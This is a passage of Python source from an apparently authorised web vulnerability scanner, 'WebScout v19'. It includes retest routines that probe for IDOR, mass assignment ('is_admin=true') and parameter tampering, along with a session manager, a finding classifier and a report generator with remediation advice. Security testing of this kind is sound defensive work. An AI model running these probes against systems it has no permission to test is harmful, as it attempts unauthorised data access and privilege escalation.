            verdict = "confirmed"
        else:
            verdict = "false_positive"

        evidence = (
            f"B1-status={base1_resp.get('status')} | "
            f"ATK-status={atk_resp.get('status')} | "
            f"B2-status={base2_resp.get('status')} | "
            f"baseline_sim={baseline_sim:.3f} | "
            f"atk_diff={atk_vs_base_sim:.3f} | "
            f"verdict={verdict}"
        )

        self._audit.record("dynamic_retest", {
            "url":            url,
            "param":          param,
            "payload":        payload[:200],
            "verdict":        verdict,
            "baseline_sim":   round(baseline_sim, 3),
            "atk_vs_base":    round(atk_vs_base_sim, 3),
            "status_differs": status_differs,
        })

        return {
            "confirmed":    confirmed,
            "verdict":      verdict,
            "evidence":     evidence,
            "baseline_sim": baseline_sim,
            "atk_vs_base":  atk_vs_base_sim,
            "baseline1":    base1_resp,
            "attack":       atk_resp,
            "baseline2":    base2_resp,
            "atk_url":      atk_url if method == "GET" else url,
        }

    # ── IDOR re-test ─────────────────────────────────────────────────────

    async def retest_idor(
        self,
        client: "WebScoutClient",
        url: str,
        id_param: str,
        own_id: str,
        other_id: str,
        sensitive_keywords: list = None,
    ) -> Optional[Finding]:
        """
        Confirms IDOR by comparing responses for two different object IDs.
        Returns a Finding if the server exposes a different (sensitive) object.
        """
        keywords = sensitive_keywords or [
            "email", "username", "password", "address", "phone",
            "ssn", "dob", "token", "secret", "api_key",
        ]

        result = await self.retest(
            client, url, id_param, other_id,
            compare_fn=lambda atk, base: any(
                kw in atk.get("text", "").lower() for kw in keywords
            ),
        )

        if result.get("confirmed") and result.get("verdict") == "confirmed":
            atk_body = result["attack"].get("text", "")
            hit_keys = [k for k in keywords if k in atk_body.lower()]
            return Finding(
                plugin="dynamic_retest",
                title=f"[CONFIRMED] IDOR via Dynamic Re-test — param '{id_param}'",
                severity="HIGH",
                confidence=94.0,
                description=(
                    f"Dynamic re-test confirmed IDOR: accessing object ID '{other_id}' "
                    f"(different from own ID '{own_id}') returned sensitive data. "
                    f"Baselines were stable (sim={result['baseline_sim']:.2f}), "
                    f"confirming the access is unauthorized."
                ),
                evidence=f"Sensitive keys found: {hit_keys} | {result['evidence']}",
                url=result["atk_url"],
                param=id_param,
                payload=other_id,
                remediation=(
                    "Enforce object-level authorization on every data access. "
                    "Verify that the requesting user owns the requested object."
                ),
                cwe="CWE-639", cvss=8.1, owasp="A01",
                tags=["idor", "dynamic-retest", "confirmed"],
            )
        return None

    # ── Mass Assignment re-test ──────────────────────────────────────────

    async def retest_mass_assignment(
        self,
        client: "WebScoutClient",
        url: str,
        privileged_field: str = "is_admin",
        privileged_value: str = "true",
    ) -> Optional[Finding]:
        """
        Confirms mass assignment by checking if a privileged field is
        accepted and reflected / takes effect.
        """
        result = await self.retest(
            client, url, privileged_field, privileged_value,
            method="POST",
            post_data={privileged_field: privileged_value},
            compare_fn=lambda atk, base: (
                privileged_field.lower() in atk.get("text", "").lower() or
                "admin" in atk.get("text", "").lower()
            ),
        )

        if result.get("confirmed") and result.get("verdict") == "confirmed":
            return Finding(
                plugin="dynamic_retest",
                title=f"[CONFIRMED] Mass Assignment via Dynamic Re-test — '{privileged_field}'",
                severity="CRITICAL",
                confidence=95.0,
                description=(
                    f"Mass assignment confirmed via 3-step dynamic re-test. "
                    f"Injecting field '{privileged_field}={privileged_value}' "
                    f"produced a measurably different response from the baseline, "
                    f"indicating the server accepted and processed the privileged field."
                ),
                evidence=result["evidence"],
                url=url,
                param=privileged_field,
                payload=privileged_value,
                remediation=(
                    "Use an allowlist-based model binding approach. "
                    "Explicitly define which fields can be set by users. "
                    "Never auto-bind all request parameters to model fields."
                ),
                cwe="CWE-915", cvss=9.8, owasp="A06",
                tags=["mass-assignment", "dynamic-retest", "confirmed"],
            )
        return None

    # ── Parameter Tampering re-test ──────────────────────────────────────

    async def retest_parameter_tampering(
        self,
        client: "WebScoutClient",
        url: str,
        param: str,
        tampered_value: str,
        original_value: str = "100",
    ) -> Optional[Finding]:
        """
        Detects parameter tampering acceptance via stable-baseline 3-step test.
        """
        result = await self.retest(
            client, url, param, tampered_value,
            compare_fn=lambda atk, base: (
                atk.get("status", 0) in (200, 201) and
                any(s in atk.get("text", "").lower() for s in [
                    "success", "confirmed", "accepted", "ok", "processed",
                ])
            ),
        )

        if result.get("confirmed") and result.get("verdict") == "confirmed":
            return Finding(
                plugin="dynamic_retest",
                title=f"[CONFIRMED] Parameter Tampering — param '{param}'",
                severity="HIGH",
                confidence=90.0,
                description=(
                    f"Parameter tampering confirmed via 3-step dynamic re-test. "
                    f"Value changed from '{original_value}' to '{tampered_value}'; "
                    f"server accepted the modified value with a success response."
                ),
                evidence=result["evidence"],
                url=result["atk_url"],
                param=param,
                payload=tampered_value,
                remediation=(
                    "Validate all numeric parameters server-side. "
                    "Apply range and type checks. "
                    "Re-compute prices/totals server-side, never trust client-supplied values."
                ),
                cwe="CWE-472", cvss=7.5, owasp="A04",
                tags=["parameter-tampering", "business-logic", "dynamic-retest", "confirmed"],
            )
        return None


# ════════════════════════════════════════════════════════════════════════
#  M-19-05 — TRIPLE TIER CLASSIFIER
#  CONFIRMED | INDICATOR | INFORMATIONAL  (replaces binary system)
# ════════════════════════════════════════════════════════════════════════

class TripleTierClassifier:
    """
    Three-tier vulnerability classification system.

    Tier 1 — CONFIRMED   (🔴)
        OOB callback received, real data extracted, exploit succeeded,
        or multi-scanner agreement with confidence ≥ 95%.
        Evidence is irrefutable and legally defensible.

    Tier 2 — INDICATOR   (🟡)
        Strong signals without OOB or actual exploitation.
        Includes timing anomalies, boolean differences, error-based hints,
        reflected payloads — requires manual verification to confirm impact.

    Tier 3 — INFORMATIONAL (🔵)
        Recon data: software versions, exposed config files, robots.txt,
        open ports, headers analysis.  No direct vulnerability, but
        useful context for attack planning and compliance reporting.

    Remediation guidance is tier-specific (see _remediation_priority).
    """

    # ── Tier 1: CONFIRMED ────────────────────────────────────────────────
    CONFIRMED_TAGS     = frozenset({
        "confirmed", "exploit-as-evidence", "oob", "oob-callback",
        "multi-scanner", "load_file", "dns-exfil",
    })
    CONFIRMED_PLUGINS  = frozenset({
        "exploit_as_evidence", "multi-scanner", "collaborator_oob",
        "external_oob_collaborator", "SafeExploitEngine",
        "oob_enhanced", "dynamic_retest",
    })
    CONFIRMED_CONF_MIN = 95.0

    # ── Tier 2: INDICATOR ────────────────────────────────────────────────
    INDICATOR_TAGS     = frozenset({
        "timing", "boolean", "error-based", "reflected", "potential",
        "time-based", "detection", "blind", "candidate",
    })
    INDICATOR_CONF_MIN = 55.0

    # ── Tier 3: INFORMATIONAL ────────────────────────────────────────────
    INFO_PLUGINS       = frozenset({
        "technology-fingerprint", "system-deep-audit",
        "database-exposure-audit", "AdvancedCoverageEngine",
        "compliance", "threat-intel", "anomaly-analysis",
    })
    INFO_SEVERITIES    = frozenset({"INFO"})
    INFO_TAGS          = frozenset({
        "informational", "recon", "fingerprint", "version",
        "disclosure", "robots", "exposure", "open-port",
    })

    # ── remediation priority by tier ────────────────────────────────────
    REMEDIATION_PRIORITY = {
        "CONFIRMED":     "IMMEDIATE — patch within 24 hours",
        "INDICATOR":     "URGENT — validate and patch within 7 days",
        "INFORMATIONAL": "REVIEW — address in next sprint / compliance cycle",
    }

    def classify(self, f: "Finding") -> str:
        """Return 'CONFIRMED', 'INDICATOR', or 'INFORMATIONAL'."""
        tags = frozenset(f.tags)

        # ─ Tier 1 ────────────────────────────────────────────────────────
        if (
            f.confidence >= self.CONFIRMED_CONF_MIN or
            bool(tags & self.CONFIRMED_TAGS) or
            any(p in f.plugin for p in self.CONFIRMED_PLUGINS) or
            f.title.startswith("[CONFIRMED]")
        ):
            return "CONFIRMED"

        # ─ Tier 3 (check before Tier 2 — low sev items fall here) ────────
        if (
            f.severity in self.INFO_SEVERITIES or
            bool(tags & self.INFO_TAGS) or
            any(p in f.plugin for p in self.INFO_PLUGINS)
        ):
            return "INFORMATIONAL"

        # ─ Tier 2 (everything else with meaningful signal) ────────────────
        return "INDICATOR"

    def classify_all(self, findings: list) -> Dict[str, list]:
        """Return dict with CONFIRMED / INDICATOR / INFORMATIONAL buckets."""
        buckets: Dict[str, list] = {
            "CONFIRMED":     [],
            "INDICATOR":     [],
            "INFORMATIONAL": [],
        }
        for f in findings:
            buckets[self.classify(f)].append(f)
        return buckets

    def annotate(self, findings: list) -> list:
        """
        Annotate findings in-place:
        - prefix title with tier tag
        - append tier tag to f.tags
        - append remediation priority note to f.remediation
        Returns the annotated list.
        """
        PREFIX = {
            "CONFIRMED":     "[CONFIRMED]",
            "INDICATOR":     "[INDICATOR]",
            "INFORMATIONAL": "[INFO]",
        }
        OLD_PREFIXES = {"[CONFIRMED]", "[Potential]", "[INDICATOR]", "[INFO]"}

        for f in findings:
            tier = self.classify(f)

            # Strip any existing prefix
            for op in OLD_PREFIXES:
                if f.title.startswith(op):
                    f.title = f.title[len(op):].strip()
            f.title = f"{PREFIX[tier]} {f.title}"

            # Tag
            tier_tag = tier.lower()
            if tier_tag not in f.tags:
                f.tags = list(f.tags) + [tier_tag]

            # Remediation note
            priority = self.REMEDIATION_PRIORITY[tier]
            if priority not in (f.remediation or ""):
                f.remediation = (
                    (f.remediation or "").rstrip(".") +
                    f"  [Priority: {priority}]"
                ).strip()

        return findings

    def print_summary(self, findings: list):
        """Print triple-tier classification summary to terminal."""
        buckets = self.classify_all(findings)
        c_count = len(buckets["CONFIRMED"])
        i_count = len(buckets["INDICATOR"])
        n_count = len(buckets["INFORMATIONAL"])

        print(f"\n  {'─'*72}")
        print(f"  {c(C.BOLD)}Triple-Tier Classification — WebScout v19{c(C.RESET)}")
        print(f"  {'─'*72}")
        print(
            f"  {c(C.RED)}[CONFIRMED]{c(C.RESET)}      {c(C.BOLD)}{c_count:>4}{c(C.RESET)}  "
            f"OOB/exploit-backed — irrefutable evidence  "
            f"{c(C.DIM)}→ Patch within 24h{c(C.RESET)}"
        )
        print(
            f"  {c(C.YELLOW)}[INDICATOR]{c(C.RESET)}      {c(C.BOLD)}{i_count:>4}{c(C.RESET)}  "
            f"Strong signals — needs manual validation  "
            f"{c(C.DIM)}→ Validate within 7 days{c(C.RESET)}"
        )
        print(
            f"  {c(C.BLUE)}[INFO]{c(C.RESET)}           {c(C.BOLD)}{n_count:>4}{c(C.RESET)}  "
            f"Recon / exposure data — context only  "
            f"{c(C.DIM)}→ Address in next sprint{c(C.RESET)}"
        )
        print(f"  {'─'*72}")
        print(f"  Total findings: {c(C.BOLD)}{len(findings)}{c(C.RESET)}")
        print(f"  {'─'*72}\n")


# ════════════════════════════════════════════════════════════════════════
#  M-19-06 — STATEFUL SESSION MANAGER
#  Auto-detect JWT / Cookie / Basic Auth · Auto-renew · Scope-binding
# ════════════════════════════════════════════════════════════════════════

class StatefulSessionManager:
    """
    Stateful session manager for authenticated scans.

    Features
    --------
    • Auto-detect auth type from config (JWT / Cookie / Basic Auth)
    • Perform form-based login if credentials are supplied
    • Parse JWT expiry (exp claim) and renew before it expires
    • Background refresh loop (asyncio.Task)
    • Inject active session into any WebScoutClient on demand
    • Detect if a response is a login-page redirect (session expired)
      and trigger re-login automatically
    • All session events logged to OOBAuditLogger
    """

    AUTH_JWT    = "JWT"
    AUTH_COOKIE = "COOKIE"
    AUTH_BASIC  = "BASIC"
    AUTH_NONE   = "NONE"

    def __init__(self, client: "WebScoutClient", cfg: "ScanConfig"):
        self._client = client
        self._cfg    = cfg
        self._audit  = OOBAuditLogger.get()

        self._auth_type:        str   = self.AUTH_NONE
        self._session_token:    str   = ""
        self._session_cookies:  dict  = {}
        self._session_expiry:   float = 0.0   # monotonic time
        self._refresh_task:     Optional[asyncio.Task] = None
        self._lock = asyncio.Lock()

    # ── initialization ────────────────────────────────────────────────────

    async def setup(self) -> bool:
        """
        Detect auth type and establish initial session.
        Returns True if an authenticated session was established.
        """
        # 1. JWT supplied directly
        if self._cfg.jwt_token or self._cfg.bearer:
            token = self._cfg.jwt_token or self._cfg.bearer
            self._auth_type     = self.AUTH_JWT
            self._session_token = token
            self._session_expiry = self._parse_jwt_expiry(token)
            self._audit.record_session("init", self.AUTH_JWT,
                                        f"token_prefix={token[:20]}")
            log("INFO", f"[SessionMgr] JWT auth active — "
                        f"expiry={'N/A' if not self._session_expiry else str(self._session_expiry)}")
            return True

        # 2. Cookie string supplied
        if self._cfg.cookies:
            self._auth_type = self.AUTH_COOKIE
            self._session_cookies = self._parse_cookie_string(self._cfg.cookies)
            self._audit.record_session("init", self.AUTH_COOKIE,
                                        f"cookies={len(self._session_cookies)}")
            log("INFO", f"[SessionMgr] Cookie auth — "
                        f"{len(self._session_cookies)} cookie(s) loaded")
            return True

        # 3. Basic Auth credentials
        if self._cfg.basic_auth and self._cfg.basic_auth[0]:
            self._auth_type = self.AUTH_BASIC
            self._audit.record_session("init", self.AUTH_BASIC,
                                        f"user={self._cfg.basic_auth[0]}")
            log("INFO", f"[SessionMgr] Basic auth — user={self._cfg.basic_auth[0]}")
            return True

        # 4. Form-based login
        if self._cfg.login_url and self._cfg.username and self._cfg.password:
            log("INFO", f"[SessionMgr] Attempting form login → {self._cfg.login_url}")
            return await self._login()

        self._auth_type = self.AUTH_NONE
        log("INFO", "[SessionMgr] No authentication configured")
        return False

    async def _login(self) -> bool:
        """Perform form-based login and capture token/cookies."""
        try:
            resp = await self._client.post(
                self._cfg.login_url,
                data={
                    "username": self._cfg.username,
                    "password": self._cfg.password,
                },
            )
            if not resp:
                log("WARN", "[SessionMgr] Login request returned no response")
                return False

            body    = resp.get("text", "")
            headers = resp.get("headers", {})

            # ─ Check for JWT in body ─────────────────────────────────────
            for pattern in [
                r'"(?:token|access_token|jwt|id_token)"\s*:\s*"([^"]{20,})"',
                r"'(?:token|access_token|jwt)'\s*:\s*'([^']{20,})'",
            ]:
                m = re.search(pattern, body)
                if m:
                    token = m.group(1)
                    self._auth_type     = self.AUTH_JWT
                    self._session_token = token
                    self._cfg.jwt_token = token
                    self._session_expiry = self._parse_jwt_expiry(token)
                    self._audit.record_session("login_success", self.AUTH_JWT,
                                                f"url={self._cfg.login_url}")
                    log("OK", f"[SessionMgr] Login successful — JWT acquired "
                                f"(prefix={token[:20]})")
                    return True

            # ─ Check for Set-Cookie ──────────────────────────────────────
            set_cookie = headers.get("Set-Cookie", headers.get("set-cookie", ""))
            if set_cookie:
                cookies = {}
                for part in (set_cookie if isinstance(set_cookie, list)
                             else [set_cookie]):
                    for seg in part.split(","):
                        m = re.match(r"\s*([^=;\s]+)\s*=\s*([^;]*)", seg)
                        if m:
                            cookies[m.group(1)] = m.group(2)
                if cookies:
                    self._auth_type       = self.AUTH_COOKIE
                    self._session_cookies = cookies
                    self._cfg.cookies     = "; ".join(
                        f"{k}={v}" for k, v in cookies.items()
                    )
                    self._session_expiry = time.monotonic() + 1800  # 30 min default
                    self._audit.record_session("login_success", self.AUTH_COOKIE,
                                                f"url={self._cfg.login_url} "
                                                f"cookies={len(cookies)}")
                    log("OK", f"[SessionMgr] Login successful — "
                                f"{len(cookies)} cookie(s) captured")
                    return True

            log("WARN", "[SessionMgr] Login completed but no token/cookies found")
            return False

        except Exception as exc:
            log("WARN", f"[SessionMgr] Login error: {exc}")
            self._audit.record_session("login_failed", self.AUTH_NONE, str(exc))
            return False

    # ── JWT utilities ────────────────────────────────────────────────────

    @staticmethod
    def _parse_jwt_expiry(token: str) -> float:
        """Extract exp claim from JWT, return as monotonic-offset float."""
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return 0.0
            pad = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(pad).decode("utf-8", "replace"))
            exp_unix = float(payload.get("exp", 0))
            if exp_unix > 0:
                now_unix  = time.time()
                remaining = exp_unix - now_unix
                return time.monotonic() + remaining
        except Exception:
            pass
        return 0.0

    @staticmethod
    def _parse_cookie_string(cookie_str: str) -> dict:
        cookies = {}
        for part in cookie_str.split(";"):
            kv = part.strip().split("=", 1)
            if len(kv) == 2:
                cookies[kv[0].strip()] = kv[1].strip()
        return cookies

    # ── auto-refresh ─────────────────────────────────────────────────────

    async def start_auto_refresh(self, renew_before_secs: float = 300.0):
        """Start background task that renews the session before expiry."""
        async def _loop():
            while True:
                await asyncio.sleep(60)
                now = time.monotonic()
                if self._session_expiry > 0:
                    remaining = self._session_expiry - now
                    if remaining < renew_before_secs:
                        log("INFO",
                            f"[SessionMgr] Session expiring in {remaining:.0f}s — "
                            f"auto-refreshing …")
                        await self._login()
                        self._apply_to_client(self._client)

        self._refresh_task = asyncio.create_task(_loop())
        log("INFO", "[SessionMgr] Auto-refresh task started "
                    f"(renew_before={renew_before_secs}s)")

    def stop_auto_refresh(self):
        if self._refresh_task and not self._refresh_task.done():
            self._refresh_task.cancel()

    # ── client injection ─────────────────────────────────────────────────

    def _apply_to_client(self, client: "WebScoutClient"):
        """Push current session credentials into a client's config."""
        if self._auth_type == self.AUTH_JWT and self._session_token:
            client.cfg.jwt_token = self._session_token
            client.cfg.bearer    = self._session_token
        elif self._auth_type == self.AUTH_COOKIE and self._session_cookies:
            client.cfg.cookies = "; ".join(
                f"{k}={v}" for k, v in self._session_cookies.items()
            )
        elif self._auth_type == self.AUTH_BASIC:
            client.cfg.basic_auth = self._cfg.basic_auth

    def inject_into_client(self, client: "WebScoutClient"):
        """Public method: inject active session into any client."""
        self._apply_to_client(client)
        self._audit.record_session(
            "injected", self._auth_type,
            f"client_id={id(client)}"
        )

    # ── login-page detection ─────────────────────────────────────────────

    def is_login_page(self, response: dict) -> bool:
        """Return True if response appears to be a login redirect."""
        if not response:
            return False
        status = response.get("status", 0)
        text   = response.get("text", "").lower()
        if status in (401, 403):
            return True
        if status == 302:
            loc = response.get("headers", {}).get("Location", "").lower()
            if any(k in loc for k in ["login", "signin", "auth"]):
                return True
        if status == 200 and any(
            kw in text for kw in [
                "please log in", "sign in to continue",
                "session expired", "unauthorized",
                "login required",
            ]
        ):
            return True
        return False

    async def ensure_valid(self, test_response: dict = None) -> bool:
        """
        If test_response looks like a login page, attempt re-login.
        Returns True if session is (still) valid.
        """
        if test_response and self.is_login_page(test_response):
            log("WARN", "[SessionMgr] Session expired — attempting re-login …")
            self._audit.record_session("expired", self._auth_type, "login page detected")
            ok = await self._login()
            if ok:
                self._apply_to_client(self._client)
            return ok
        return self._auth_type != self.AUTH_NONE

    def summary(self) -> str:
        remaining = max(0, self._session_expiry - time.monotonic()) \
                    if self._session_expiry else 0
        return (
            f"AuthType={self._auth_type} | "
            f"HasToken={bool(self._session_token)} | "
            f"Cookies={len(self._session_cookies)} | "
            f"ExpiresIn={remaining:.0f}s"
        )


# ════════════════════════════════════════════════════════════════════════
#  M-19-07 — TRIPLE-TIER REPORT ENGINE
#  Generates a structured HTML / Markdown report with per-tier sections
#  and tier-specific remediation guidance
# ════════════════════════════════════════════════════════════════════════

class TripleTierReportEngine:
    """
    Generates a complete security report structured around the three tiers.

    Sections
    --------
    1. Executive Summary  — counts, risk score, scan metadata
    2. CONFIRMED Findings — full detail with OOB evidence
    3. INDICATOR Findings — flagged items needing manual review
    4. INFORMATIONAL      — recon surface, version disclosure
    5. Audit Trail        — OOB events, session events, retest results
    6. Remediation Matrix — tier-specific action plan

    Outputs
    -------
    • Markdown (.md)
    • HTML     (.html) — styled, self-contained
    • JSON     (.json) — machine-readable for integrations
    """

    SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    SEVERITY_EMOJI = {
        "CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡",
        "LOW": "🔵", "INFO": "⚪",
    }

    def __init__(self):
        self._classifier = TripleTierClassifier()
        self._audit      = OOBAuditLogger.get()

    # ── Markdown report ───────────────────────────────────────────────────

    def to_markdown(self, findings: list, target: str,
                    out_path: str = "webscout_v19_report.md") -> str:
        buckets = self._classifier.classify_all(findings)
        lines   = self._build_md(buckets, findings, target)
        with open(out_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines))
        log("INFO", f"[TripleTierReport] Markdown report → {out_path}")
        return out_path

    def to_html(self, findings: list, target: str,
                out_path: str = "webscout_v19_report.html") -> str:
        buckets = self._classifier.classify_all(findings)
        md_lines = self._build_md(buckets, findings, target)
        html = self._md_to_html(md_lines, target)
        with open(out_path, "w", encoding="utf-8") as fh:
            fh.write(html)
        log("INFO", f"[TripleTierReport] HTML report → {out_path}")
        return out_path

    def to_json(self, findings: list, target: str,
                out_path: str = "webscout_v19_report.json") -> str:
        buckets  = self._classifier.classify_all(findings)
        audit_s  = self._audit.summary()
        data = {
            "meta": {
                "target":    target,
                "timestamp": datetime.now().isoformat(),
                "tool":      "WebScout Ultimate v19",
                "total":     len(findings),
            },
            "audit_summary": audit_s,
            "confirmed":     [asdict(f) for f in buckets["CONFIRMED"]],
            "indicator":     [asdict(f) for f in buckets["INDICATOR"]],
            "informational": [asdict(f) for f in buckets["INFORMATIONAL"]],
            "audit_trail":   self._audit.get_records(),
        }
        with open(out_path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2, default=str)
        log("INFO", f"[TripleTierReport] JSON report → {out_path}")
        return out_path

    # ── internal builders ─────────────────────────────────────────────────

    def _sev_sort(self, findings: list) -> list:
        return sorted(
            findings,
            key=lambda f: self.SEVERITY_ORDER.get(f.severity, 5),
        )

    def _build_md(self, buckets: dict, all_findings: list, target: str) -> list:
        confirmed    = self._sev_sort(buckets["CONFIRMED"])
        indicators   = self._sev_sort(buckets["INDICATOR"])
        informational = self._sev_sort(buckets["INFORMATIONAL"])
        audit_s = self._audit.summary()
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")

        lines = [
            "# WebScout Ultimate v19 — Security Report",
            "",
            f"> **Target:** `{target}`  ",
            f"> **Generated:** {ts}  ",
            f"> **Tool:** WebScout Ultimate v19 (OOB Enhancement Patch)  ",
            "",
            "---",
            "",
            "## Executive Summary",
            "",
            f"| Tier | Count | Action |",
            f"|------|-------|--------|",
            f"| 🔴 CONFIRMED    | **{len(confirmed)}** | Patch immediately (< 24h) |",
            f"| 🟡 INDICATOR    | **{len(indicators)}** | Validate & patch (< 7 days) |",
            f"| 🔵 INFORMATIONAL| **{len(informational)}** | Review in next sprint |",
            f"| **Total**       | **{len(all_findings)}** | |",
            "",
            f"**OOB Audit Summary:** {audit_s}",
            "",
            "---",
            "",
        ]

        # ─ CONFIRMED section ──────────────────────────────────────────────
        lines += [
            "## 🔴 Tier 1 — CONFIRMED Findings",
            "",
            "> These findings have irrefutable evidence: OOB callbacks, real data extracted,",
            "> or successful exploit execution.  Immediate remediation required.",
            "",
        ]
        if confirmed:
            for f in confirmed:
                lines += self._finding_md(f, tier="CONFIRMED")
        else:
            lines += ["*No confirmed findings.*", ""]

        lines += ["---", ""]

        # ─ INDICATOR section ──────────────────────────────────────────────
        lines += [
            "## 🟡 Tier 2 — INDICATOR Findings",
            "",
            "> Strong signals detected by automated analysis.  Manual validation",
            "> is required to confirm exploitability and determine business impact.",
            "",
        ]
        if indicators:
            for f in indicators:
                lines += self._finding_md(f, tier="INDICATOR")
        else:
            lines += ["*No indicator findings.*", ""]

        lines += ["---", ""]

        # ─ INFORMATIONAL section ──────────────────────────────────────────
        lines += [
            "## 🔵 Tier 3 — INFORMATIONAL",
            "",
            "> Recon data, version disclosures, and surface-area observations.",
            "> No direct vulnerability, but useful context for hardening.",
            "",
        ]
        if informational:
            for f in informational:
                lines += self._finding_md(f, tier="INFORMATIONAL")
        else:
            lines += ["*No informational findings.*", ""]

        lines += ["---", ""]

        # ─ Audit trail ────────────────────────────────────────────────────
        lines += [
            "## Audit Trail",
            "",
            "| Timestamp | Event | Details |",
            "|-----------|-------|---------|",
        ]
        for rec in self._audit.get_records()[:100]:
            ts_r    = rec.get("timestamp", "")[:19]
            ev      = rec.get("event_type", "")
            det     = json.dumps(
                {k: v for k, v in rec.items()
                 if k not in ("timestamp", "event_type")},
                default=str
            )[:120]
            lines.append(f"| `{ts_r}` | `{ev}` | {det} |")
        lines += ["", "---", ""]

        # ─ Remediation matrix ────────────────────────────────────────────
        lines += [
            "## Remediation Matrix",
            "",
            "| Priority | Tier | Finding | Remediation |",
            "|----------|------|---------|-------------|",
        ]
        for tier_name, tier_findings, action in [
            ("CONFIRMED",     confirmed,    "Patch within **24 hours**"),
            ("INDICATOR",     indicators,   "Validate & patch within **7 days**"),
            ("INFORMATIONAL", informational,"Address in **next sprint**"),
        ]:
            for f in tier_findings[:20]:
                sev_em = self.SEVERITY_EMOJI.get(f.severity, "⚪")
                rem = (f.remediation or "Apply security controls.")[:120].replace("|", "∣")
                lines.append(
                    f"| {action} | {tier_name} | "
                    f"{sev_em} {f.title[:60].replace('|','∣')} | {rem} |"
                )
        lines += ["", ""]

        return lines

    def _finding_md(self, f: Finding, tier: str) -> list:
        sev_em = self.SEVERITY_EMOJI.get(f.severity, "⚪")
        lines = [
            f"### {sev_em} {f.title}",
            "",
            f"| Field | Value |",
            f"|-------|-------|",
            f"| **Plugin** | `{f.plugin}` |",
            f"| **Severity** | {f.severity} |",
            f"| **Confidence** | {f.confidence:.0f}% |",
            f"| **CVSS** | {f.cvss:.1f} |",
            f"| **CWE** | {f.cwe or 'N/A'} |",
            f"| **OWASP** | {f.owasp or 'N/A'} |",
            f"| **URL** | `{f.url[:200]}` |",
        ]
        if f.param:
            lines.append(f"| **Parameter** | `{f.param}` |")
        lines += [
            "",
            f"**Description:** {f.description}",
            "",
        ]
        if f.evidence:
            lines += [
                "**Evidence:**",
                "```",
                f.evidence[:600],
                "```",
                "",
            ]
        if f.payload:
            lines += [
                "**Payload:**",
                "```",
                f.payload[:400],
                "```",
                "",
            ]
        if f.poc:
            lines += [
                "**PoC:**",
                "```bash",
                f.poc[:500],
                "```",
                "",
            ]
        if f.remediation:
            lines += [
                f"**Remediation:** {f.remediation}",
                "",
            ]
        lines += ["---", ""]
        return lines

    def _md_to_html(self, md_lines: list, target: str) -> str:
        """Minimal Markdown-to-HTML conversion (no external dependency)."""
        content_lines = []
        in_table = False
        in_code  = False
        code_lang = ""

        for raw in md_lines:
            line = raw

            # Code block
            if line.startswith("```"):
                if not in_code:
                    in_code   = True
                    code_lang = line[3:].strip()
                    content_lines.append(f'<pre><code class="{code_lang}">')
                else:
                    in_code = False
                    content_lines.append("</code></pre>")
                continue
            if in_code:
                content_lines.append(line
                    .replace("&", "&amp;")
                    .replace("<", "&lt;")
                    .replace(">", "&gt;"))
                continue

            # Table
            if line.startswith("|"):
                if not in_table:
                    in_table = True
                    content_lines.append('<table class="ws-table">')
                cells = [c.strip() for c in line.split("|")[1:-1]]
                if all(re.match(r"^[-:]+$", c.replace("*","")) for c in cells):
                    continue  # separator row
                tag = "th" if not content_lines or "</th>" in (content_lines[-1] if content_lines else "") else "td"
                row = "".join(f"<{tag}>{c}</{tag}>" for c in cells)
                content_lines.append(f"<tr>{row}</tr>")
                continue
            else:
                if in_table:
                    in_table = False
                    content_lines.append("</table>")

            # Headings
            m = re.match(r"^(#{1,4})\s+(.*)", line)
            if m:
                lvl = len(m.group(1))
                txt = m.group(2)
                content_lines.append(f"<h{lvl}>{txt}</h{lvl}>")
                continue

            # HR
            if re.match(r"^-{3,}$", line.strip()):
                content_lines.append("<hr>")
                continue

            # Empty line
            if not line.strip():
                content_lines.append("<br>")
                continue

            # Bold / code inline
            line = re.sub(r"\*\*(.+?)\*\*", r"<strong>\1</strong>", line)
            line = re.sub(r"`([^`]+)`", r"<code>\1</code>", line)
            line = re.sub(r"^> (.*)", r"<blockquote>\1</blockquote>", line)

            content_lines.append(f"<p>{line}</p>")

        if in_table:
            content_lines.append("</table>")

        body = "\n".join(content_lines)

        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WebScout v19 — Report — {target}</title>
<style>
  body {{ font-family: 'Segoe UI', sans-serif; background: #0d0d0d; color: #e0e0e0;
         margin: 0; padding: 20px; }}
  h1 {{ color: #ff4444; border-bottom: 2px solid #ff4444; padding-bottom: 8px; }}
  h2 {{ color: #ff8800; margin-top: 32px; }}
  h3 {{ color: #ffcc00; margin-top: 20px; }}
  h4 {{ color: #44aaff; }}
  table.ws-table {{ border-collapse: collapse; width: 100%; margin: 12px 0; }}
  table.ws-table th, table.ws-table td {{
    border: 1px solid #333; padding: 8px 12px; text-align: left; }}
  table.ws-table th {{ background: #1a1a2e; color: #e0e0e0; font-weight: bold; }}
  table.ws-table tr:nth-child(even) {{ background: #111; }}
  pre, code {{ background: #1a1a1a; color: #00ff88; padding: 2px 6px;
               border-radius: 3px; font-size: 0.9em; }}
  pre {{ display: block; padding: 12px; overflow-x: auto; white-space: pre-wrap; }}
  blockquote {{ border-left: 4px solid #444; margin-left: 0; padding-left: 16px;
                color: #aaa; }}
  hr {{ border: 0; border-top: 1px solid #333; margin: 24px 0; }}
  strong {{ color: #ffffff; }}
  a {{ color: #44aaff; }}
  .badge-CRITICAL {{ color: #ff4444; font-weight: bold; }}
  .badge-HIGH     {{ color: #ff8800; font-weight: bold; }}
  .badge-MEDIUM   {{ color: #ffcc00; }}
  .badge-LOW      {{ color: #44aaff; }}
  .badge-INFO     {{ color: #888; }}
</style>
</head>
<body>
{body}
</body>
</html>"""


